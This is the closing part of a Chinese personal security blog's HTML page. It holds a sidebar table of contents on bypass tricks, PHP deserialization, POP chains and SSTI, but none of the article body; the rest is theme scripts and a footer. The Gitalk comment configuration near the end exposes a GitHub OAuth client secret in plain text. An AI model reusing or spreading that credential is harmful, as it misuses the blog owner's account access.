class="nav-link" href="#5-%E7%BB%95%E8%BF%87%E6%AD%A3%E5%88%99%E5%8C%B9%E9%85%8D"><span class="nav-number">1.2.9.2.5.</span> <span class="nav-text">5.绕过正则匹配</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#6-%E7%BB%95%E8%BF%87%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6"><span class="nav-number">1.2.9.2.6.</span> <span class="nav-text">6.绕过长度限制</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4"><span class="nav-number">1.2.9.3.</span> <span class="nav-text">2.常用命令</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8D%81%E3%80%81%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3"><span class="nav-number">1.2.10.</span> <span class="nav-text">十、暴力破解</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8D%81%E4%B8%80%E3%80%81%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-number">1.2.11.</span> <span class="nav-text">十一、反序列化</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%9A"><span class="nav-number">1.2.11.1.</span> <span class="nav-text">序列化：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#php%E7%9A%84%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-number">1.2.11.2.</span> <span class="nav-text">php的序列化和反序列化</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#php%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95"><span class="nav-number">1.2.11.3.</span> <span class="nav-text">php魔术方法</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#construct"><span class="nav-number">1.2.11.3.1.</span> <span class="nav-text">__construct()</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#destruct"><span class="nav-number">1.2.11.3.2.</span> <span class="nav-text">__destruct()</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#call"><span class="nav-number">1.2.11.3.3.</span> <span class="nav-text">__call</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#callStatic"><span class="nav-number">1.2.11.3.4.</span> <span class="nav-text">__callStatic</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#get"><span class="nav-number">1.2.11.3.5.</span> <span class="nav-text">__get</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#set"><span class="nav-number">1.2.11.3.6.</span> <span class="nav-text">__set</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#isset"><span class="nav-number">1.2.11.3.7.</span> <span class="nav-text">__isset</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#unset"><span class="nav-number">1.2.11.3.8.</span> <span class="nav-text">__unset</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#sleep"><span class="nav-number">1.2.11.3.9.</span> <span class="nav-text">__sleep</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#wakeup"><span class="nav-number">1.2.11.3.10.</span> <span class="nav-text">__wakeup</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#toString-NaN"><span class="nav-number">1.2.11.3.11.</span> <span class="nav-text">__toString</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#invoke"><span class="nav-number">1.2.11.3.12.</span> <span class="nav-text">__invoke</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#clone"><span class="nav-number">1.2.11.3.13.</span> <span class="nav-text">__clone</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#wakeup-%E5%87%BD%E6%95%B0%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="nav-number">1.2.11.4.</span> <span class="nav-text">__wakeup()函数绕过漏洞原理</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#1-%E4%BD%8E%E7%89%88%E6%9C%AC%E7%9A%84php"><span class="nav-number">1.2.11.4.1.</span> <span class="nav-text">1.低版本的php</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#2-%E9%AB%98%E4%B8%80%E4%BA%9B%E7%9A%84%E7%89%88%E6%9C%AC"><span class="nav-number">1.2.11.4.1.1.</span> <span class="nav-text">2.高一些的版本</span></a></li></ol></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#popchain"><span class="nav-number">1.2.11.5.</span> <span class="nav-text">*popchain</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%B8%AA%E4%BA%BA-%E4%B8%80%E4%BA%9B%E6%96%87%E7%AB%A0%E5%AF%B9-php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E4%B8%80%E4%BA%9B%E8%AE%A4%E7%9F%A5"><span class="nav-number">1.2.11.6.</span> <span class="nav-text">*个人+一些文章对 php反序列化的一些认知</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8D%81%E4%BA%8C%E3%80%81ssti"><span class="nav-number">1.2.12.</span> <span class="nav-text">十二、ssti</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%85%B3%E4%BA%8E%E5%9F%BA%E4%BA%8Eflask%E7%9A%84SSTI%E6%BC%8F%E6%B4%9E%E7%9A%84%E9%98%B6%E6%AE%B5%E5%AD%A6%E4%B9%A0%E5%B0%8F%E7%BB%93%EF%BC%9A"><span class="nav-number">1.2.12.1.</span> <span class="nav-text">关于基于flask的SSTI漏洞的阶段学习小结：</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#SSTI%E7%9A%84%E7%90%86%E8%A7%A3%EF%BC%9A"><span class="nav-number">1.2.12.1.1.</span> <span class="nav-text">SSTI的理解：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#SSTI%E5%BC%95%E5%8F%91%E7%9A%84%E7%9C%9F%E6%AD%A3%E5%8E%9F%E5%9B%A0%EF%BC%9A"><span class="nav-number">1.2.12.1.2.</span> <span class="nav-text">SSTI引发的真正原因：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#render-template%E6%B8%B2%E6%9F%93%E5%87%BD%E6%95%B0%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9A"><span class="nav-number">1.2.12.1.3.</span> <span class="nav-text">render_template渲染函数是什么：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#render-template%EF%BC%9A"><span class="nav-number">1.2.12.1.4.</span> <span class="nav-text">render_template：</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Smarty-SSTI%E5%88%A9%E7%94%A8"><span class="nav-number">1.2.12.2.</span> <span class="nav-text">Smarty SSTI利用</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E7%A1%AE%E8%AE%A4"><span class="nav-number">1.2.12.2.1.</span> <span class="nav-text">漏洞确认</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%B8%B8%E8%A7%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="nav-number">1.2.12.2.2.</span> <span class="nav-text">常规利用方式</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#php-php-%E6%A0%87%E7%AD%BE"><span class="nav-number">1.2.12.2.2.1.</span> <span class="nav-text">{php}{&#x2F;php}标签</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#literal-%E6%A0%87%E7%AD%BE"><span class="nav-number">1.2.12.2.2.2.</span> <span class="nav-text">{literal} 标签</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E9%9D%99%E6%80%81%E6%96%B9%E6%B3%95"><span class="nav-number">1.2.12.2.3.</span> <span class="nav-text">静态方法</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#if-%E6%A0%87%E7%AD%BE"><span class="nav-number">1.2.12.2.3.1.</span> <span class="nav-text">{if}标签</span></a></li></ol></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Tornado-SSTI%E5%88%A9%E7%94%A8"><span class="nav-number">1.2.12.3.</span> <span class="nav-text">Tornado SSTI利用</span></a></li></ol></li></ol></li></ol></li></ol></div>
      </div>
      <!--/noindex-->
     
	 
  

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="Ttoc"
      src="/images/touxiang.png">
  <p class="site-author-name" itemprop="name">Ttoc</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives">
          <span class="site-state-item-count">16</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">4</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author motion-element">
      <span class="links-of-author-item">
        <a href="https://github.com/try-to-change" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;try-to-change" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="mailto:1843851200@qq.com" title="E-Mail → mailto:1843851200@qq.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
      </span>
  </div>



		
		 <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=1498723813&auto=1&height=66"></iframe>
		
      </div>
        <div class="back-to-top motion-element">
          <i class="fa fa-arrow-up"></i>
          <span>0%</span>
        </div>
	   
		
	 
    </div>
  </aside>
  <div id="sidebar-dimmer">
  
  </div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2022</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Ttoc</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-area"></i>
    </span>
      <span class="post-meta-item-text">站点总字数：</span>
    <span title="站点总字数">174k</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
      <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
    <span title="站点阅读时长">2:38</span>
</div>

<script>
    //   自定义邮箱审核规则
    document.body.addEventListener('click', function(e) {
        if (e.target.classList.contains('vsubmit')) {
            const email = document.querySelector('input[type=email]');
            const nick = document.querySelector('input[name=nick]');
            const reg = /^[A-Za-z0-9\u4e00-\u9fa5]+@[a-zA-Z0-9_-]+(\.[a-zA-Z0-9_-]+)+$/;
            if (!email.value || !nick.value || !reg.test(email.value)) {
                const str = `<div class="valert text-center"><div class="vtext">请填写正确的昵称和邮箱！</div></div>`;
                const vmark = document.querySelector('.vmark');
                vmark.innerHTML = str;
                vmark.style.display = 'block';
                setTimeout(function() {
                    vmark.style.display = 'none';
                    vmark.innerHTML = '';
                }, 2500);
            }
        }
    })
</script>

<!-- 评论框美化 -->
<style>
    #comments .veditor{
        min-height: 10rem;
        background-image: url(https://gitee.com/wugenqiang/PictureBed/raw/master/CS-Notes/20200425091751.png);
        background-size: contain;
        background-repeat: no-repeat;
        background-position: right;
        background-color: rgba(255,255,255,0);
        resize: none;}
</style>

        
<div class="busuanzi-count">
 <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="总访客量">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="总访问量">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/pjax/pjax.min.js"></script>
  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>

  <script>
var pjax = new Pjax({
  selectors: [
    'head title',
    '#page-configurations',
    '.content-wrap',
    '.post-toc-wrap',
    '.languages',
    '#pjax'
  ],
  switches: {
    '.post-toc-wrap': Pjax.switches.innerHTML
  },
  analytics: false,
  cacheBust: false,
  scrollTo : !CONFIG.bookmark.enable
});

window.addEventListener('pjax:success', () => {
  document.querySelectorAll('script[data-pjax], script#page-configurations, #pjax script').forEach(element => {
    var code = element.text || element.textContent || element.innerHTML || '';
    var parent = element.parentNode;
    parent.removeChild(element);
    var script = document.createElement('script');
    if (element.id) {
      script.id = element.id;
    }
    if (element.className) {
      script.className = element.className;
    }
    if (element.type) {
      script.type = element.type;
    }
    if (element.src) {
      script.src = element.src;
      // Force synchronous loading of peripheral JS.
      script.async = false;
    }
    if (element.dataset.pjax !== undefined) {
      script.dataset.pjax = '';
    }
    if (code !== '') {
      script.appendChild(document.createTextNode(code));
    }
    parent.appendChild(script);
  });
  NexT.boot.refresh();
  // Define Motion Sequence & Bootstrap Motion.
  if (CONFIG.motion.enable) {
    NexT.motion.integrator
      .init()
      .add(NexT.motion.middleWares.subMenu)
      .add(NexT.motion.middleWares.postList)
      .bootstrap();
  }
  NexT.utils.updateSidebarPosition();
});
</script>




  




  
<script src="/js/local-search.js"></script>













    <div id="pjax">
  

  
<script src="https://unpkg.com/darkmode-js@1.5.7/lib/darkmode-js.min.js"></script>

<script>
var options = {
  bottom: '64px',
  right: 'unset',
  left: '32px',
  time: '0.5s',
  mixColor: 'transparent',
  backgroundColor: 'transparent',
  buttonColorDark: '#100f2c',
  buttonColorLight: '#fff',
  saveInCookies: true,
  label: '🌓',
  autoMatchOsTheme: true
}
const darkmode = new Darkmode(options);
window.darkmode = darkmode;
darkmode.showWidget();


</script>

<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.css">

<script>
NexT.utils.loadComments(document.querySelector('#gitalk-container'), () => {
  NexT.utils.getScript('//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js', () => {
    var gitalk = new Gitalk({
      clientID    : '9153f63cdb4dae71592a',
      clientSecret: '593e9954e7fd5e6e46f57b66481f50e1adc53afb',
      repo        : 'blog-comment',
      owner       : 'try-to-change',
      admin       : ['try-to-change'],
      id          : '7a9470604c00828c3f7650a564320cb1',
        language: 'zh-CN',
      distractionFreeMode: true
    });
    gitalk.render('gitalk-container');
  }, window.Gitalk);
});
</script>

    </div>
  
<script type="text/javascript" 
color="0,255,0" opacity="100" count="200" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js">
</script>


<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"model":{"jsonPath":"/live2dw/assets/wanko.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":"ture"},"log":false});</script></body>
</html>
